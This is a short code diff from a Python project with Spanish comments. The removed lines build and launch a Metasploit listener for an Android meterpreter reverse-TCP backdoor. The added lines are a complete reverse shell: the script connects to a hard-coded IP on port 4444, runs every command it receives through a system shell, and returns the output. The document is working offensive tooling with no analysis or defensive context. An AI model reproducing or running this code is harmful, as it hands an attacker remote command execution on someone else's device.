@@ -1,20 +1,21 @@
-import os 
+import socket
+import subprocess
+import os
 
-def listener():
-	print("""
-	Listener para  Backdoor Android
-		""")
-	sel = input("Para configurar el listener presione 1:")
-	if(sel=="1"):
-		lhost = input("LHOST: ")
-		lport = input("LPORT: ")
-		os.chdir('//tmp')
-		check_tmp = os.listdir(os.curdir)
-		myfile = open('escuchador.rc', 'w')
-		myfile.write ('use exploit/multi/handler\n')
-		myfile.write ('set payload android/meterpreter/reverse_tcp\n')
-		myfile.write ('set lhost ' + lhost + '\n' )
-		myfile.write ('set lport ' + lport + '\n')
-		myfile.write ('exploit')
-		myfile.close()
-		os.system('msfconsole -r /tmp/escuchador.rc') 
+ip = "192.168.0.207"
+port = 4444
+
+connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect.connect((ip, port))
+
+while True:
+	data = connect.recv(1024)
+	if data[:2].decode('utf-8') == 'cd':
+		os.chdir(data[3:].decode('utf-8'))
+	if len(data) > 0:
+		cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stderr= subprocess.PIPE, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
+		bytes = cmd.stdout.read() + cmd.stderr.read()
+		info_cliente = str(bytes)
+		connect.send(str.encode(info_cliente) + str.encode(os.getcwd() + ">"))
+
+connect.close()
